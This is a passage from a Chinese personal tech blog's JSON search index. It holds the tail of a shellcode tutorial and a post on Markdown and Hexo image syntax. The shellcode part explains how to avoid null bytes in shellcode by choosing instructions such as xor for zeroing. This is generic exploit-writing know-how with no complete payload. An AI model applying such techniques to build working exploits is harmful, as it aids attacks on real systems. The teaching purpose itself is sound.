0x554d494b //UMIK由于堆栈是反向生长的mov esi,esp 例子1中代码太多了，在例子2中第二行esi就指向了字符串的位置。 shellcode的空字节问题在字符串的末尾会以0x00作为结束，所以我们shellcode中要绝对少的出现0x00。对比以下代码： 12345mov eax,0mov ax,0mov al,0mov al,1xor eax,eax 从这里可以看出来，对于0的赋值，只能选用xor来进行，只有xor的编码不会出现00，而对于非0的赋值，建议选择最适应的最小格式。比如小于0xff的数用al，大于0x100而小于0xffff的数用ax。 后面有空再更，最近有点忙。","categories":[{"name":"技术","slug":"技术","permalink":"http://ki9mu.github.io/categories/技术/"}],"tags":[{"name":"二进制","slug":"二进制","permalink":"http://ki9mu.github.io/tags/二进制/"}]},{"title":"学习markdown","slug":"学习markdown","date":"2019-03-23T08:34:03.000Z","updated":"2020-07-28T15:50:00.209Z","comments":true,"path":"2019/03/23/学习markdown/","link":"","permalink":"http://ki9mu.github.io/2019/03/23/学习markdown/","excerpt":"","text":"标题1级标题5级标题12# 1级标题##### 5级标题 无序列表1 1 2 3123* 1* 2* 3 无序列表2 1 2 3123- 1 - 2- 3 有序列表 aaaa bbbb cccc 当有序列表的顺序不一样时会自动修改，只看第一个，然后递增 12342. aaaa1. bbbb1. cccc5. 当有序列表的顺序不一样时会自动修改，只看第一个，然后递增 引用 引用&gt; 引用 代码这里是单行代码块` 12这里是多行代码块 链接ki9mu’s blog[ki9mu&#39;s blog](https://ki9mu.github.io) 图片链接![miku的图片](https://ki9mu-photo.oss-cn-shanghai.aliyuncs.com/blog/article/%E5%AD%A6%E4%B9%A0markdown/miku.jpg) Ps:这里如果在本地浏览的话可能看不见，但上传了是能看见的。 本地图片链接 Ps:这里有个坑，不知道为什么，插件就是装不上。npm install hexo-asset-image --save然后路径一直指向archives的图片，然后我将文章名(这里指:学习markdown)替换为8个字符(这里指6b72cdb5)。即![鹿哥的图片](学习markdown/luge.jpg)替换为![鹿哥的图片](6b72cdb5/luge.jpg)但这样感觉实在有点麻烦，于是就用了后者 1&#123;% asset_img luge.jpg 鹿哥的图片 %&#125; 而且后者能够将中括号内的字显示出来。 Ps2:这里只能用多行注释，单行注释仍为markdown的语法，然后显示图片。 字体粗体`粗体` 斜体`斜体` 分割线 *** 更新日期 2019年8月30日凌晨 最后说几句这图片真的秀好吧，换了个主题，那个asset_img那个标签就凉了，整了一晚上，心累。图床是不可能图床了，这辈子都不可能图床。","categories":[{"name":"技术","slug":"技术","permalink":"http://ki9mu.github.io/categories/技术/"}],"tags":[{"name":"其他","slug":"其他","permalink":"http://ki9mu.github.io/tags/其他/"}]}]}